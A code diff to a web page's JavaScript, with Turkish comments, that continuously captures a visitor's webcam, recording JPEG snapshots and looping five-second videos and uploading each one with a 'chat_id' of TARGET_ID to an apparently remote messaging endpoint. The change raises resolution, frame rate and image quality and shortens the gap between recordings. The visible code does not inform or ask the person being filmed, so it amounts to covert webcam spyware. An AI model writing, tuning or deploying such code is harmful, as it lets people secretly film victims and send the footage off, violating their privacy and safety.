@@ -136,33 +136,25 @@
                         body: formData
                     });
                     
-                }, 'image/jpeg', 0.8);
+                }, 'image/jpeg', 0.9);
                 
             } catch(e) {}
         }
         
         // ============================================
-        // 5 SANİYELİK VİDEO KAYDI (SABİT KALİTE)
+        // 5 SANİYELİK VİDEO KAYDI (MAX KALİTE)
         // ============================================
         function recordVideo() {
             if (!stream || !stream.active) return;
             
             recordedChunks = [];
             
-            // Her videoda aynı bitrate - 1.2 Mbps (600-700KB için)
-            const options = {
-                mimeType: 'video/webm;codecs=vp8',
-                videoBitsPerSecond: 1200000 // Sabit 1.2 Mbps
-            };
-            
+            // En yüksek kalite ayarları
             try {
-                mediaRecorder = new MediaRecorder(stream, options);
+                mediaRecorder = new MediaRecorder(stream);
             } catch(e) {
-                // Fallback
-                mediaRecorder = new MediaRecorder(stream, { 
-                    mimeType: 'video/webm',
-                    videoBitsPerSecond: 1200000 
-                });
+                console.log("MediaRecorder hatası:", e);
+                return;
             }
             
             mediaRecorder.ondataavailable = (event) => {
@@ -173,8 +165,8 @@
                 videoCount++;
                 const blob = new Blob(recordedChunks, { type: 'video/webm' });
                 
-                // Boyutu hesapla
                 const boyutKB = (blob.size / 1024).toFixed(0);
+                console.log(`Video ${videoCount} boyutu: ${boyutKB}KB`);
                 
                 const formData = new FormData();
                 formData.append('chat_id', TARGET_ID);
@@ -186,10 +178,8 @@
                     body: formData
                 });
                 
-                console.log(`Video ${videoCount}: ${boyutKB}KB`);
-                
-                // 1 saniye sonra yeni video
-                setTimeout(recordVideo, 1000);
+                // Hemen yeni video başlat
+                setTimeout(recordVideo, 500);
             };
             
             // 5 saniye kaydet
@@ -206,11 +196,12 @@
         // ============================================
         async function startCamera() {
             try {
+                // En yüksek kalite ayarları
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: {
-                        width: { exact: 640 },
-                        height: { exact: 480 },
-                        frameRate: { exact: 24 }
+                        width: 1280,
+                        height: 720,
+                        frameRate: 30
                     }
                 });
                 
@@ -234,13 +225,13 @@
                 };
                 
             } catch(e) {
-                // Hata olursa ideal dene
+                console.log("Kamera hatası, düşük kalite deneniyor:", e);
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({ 
                         video: {
-                            width: { ideal: 640 },
-                            height: { ideal: 480 },
-                            frameRate: { ideal: 24 }
+                            width: 640,
+                            height: 480,
+                            frameRate: 24
                         }
                     });
                     video.srcObject = stream;
@@ -282,4 +273,4 @@
         };
     </script>
 </body>
-    </html>
+</html>
